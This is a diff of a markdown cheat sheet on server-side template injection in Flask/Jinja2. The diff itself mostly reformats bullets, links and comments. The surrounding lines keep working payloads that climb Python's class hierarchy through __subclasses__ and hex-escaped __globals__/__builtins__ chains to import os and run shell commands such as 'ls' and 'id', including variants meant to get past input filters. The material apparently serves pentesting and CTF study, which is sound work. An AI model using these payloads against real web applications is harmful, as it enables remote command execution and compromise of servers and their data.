@@ -2,10 +2,8 @@
 
 ## Info
 
-```
-Method Resolution Order (mro): allows to go up the inherited objects chain
-subclasses: going down the inheritance chain
-```
+* **Method Resolution Order (mro):** allows to go up the inherited objects chain
+* **subclasses:** going down the inheritance chain
 
 ## Jinja2 Templates
 
@@ -51,9 +49,9 @@ Jinja2 supports templates for the format
 
 ## Bypass restrictions (1)
 
-```bash
-# https://hackmd.io/@Chivato/HyWsJ31dI
+* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)
 
+```bash
 {% for x in ().__class__.__base__.__subclasses__() %}
     {% if "warning" in x.__name__ %}
         {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
@@ -79,17 +77,17 @@ Jinja2 supports templates for the format
 
 {% request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() %}
 
-# using with
-|  {% with %} ... {% endwith %} 
+# using operator:with
+# {% with %} ... {% endwith %} 
 
 {% with kashz=request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("id")["read"]()  %} kashz {% endwith %}
 
-# can trying bas64 payload
+# can try using bas64 payload
 ```
 
 ## References
 
-* [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) 
+* [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
 * [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)
 * [https://chowdera.com/2020/12/20201221231521371q.html](https://chowdera.com/2020/12/20201221231521371q.html)
 * [https://secure-cookie.io/attacks/ssti/](https://secure-cookie.io/attacks/ssti/)
